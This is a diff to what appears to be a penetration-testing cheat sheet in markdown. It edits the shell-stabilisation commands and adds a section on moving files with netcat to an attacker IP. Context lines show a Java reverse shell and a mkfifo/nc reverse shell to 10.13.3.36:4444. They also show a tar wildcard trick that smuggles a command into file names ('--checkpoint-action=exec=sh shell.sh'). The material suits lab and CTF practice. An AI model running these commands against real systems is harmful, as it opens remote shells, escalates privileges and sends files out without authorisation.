@@ -41,8 +41,7 @@ Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new
 
 ## Stabilisation of Shell
 ```sh
-python3 -c 'import pty; pty.spawn("/bin/bash")'
-export TERM=xterm
+python3 -c 'import pty; pty.spawn("/bin/bash")'; export TERM=xterm
 ```
 CTRL-z
 ```sh
@@ -63,4 +62,16 @@ https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/
 echo "mkfifo /tmp/kirxhbg; nc 10.13.3.36 4444 0</tmp/kirxhbg | /bin/sh >/tmp/kirxhbg 2>&1; rm /tmp/kirxhbg" > shell.sh
 echo "" > "--checkpoint-action=exec=sh shell.sh"
 echo "" > --checkpoint=1
+```
+
+## Using nc To Transfer Files
+
+On the receiving machine
+```bash
+nc -l -p 1234 > file
+```
+On the sending machine, open the connection and send the file.
+
+```bash
+nc -w 3 10.13.3.36 1234 < file
 ```
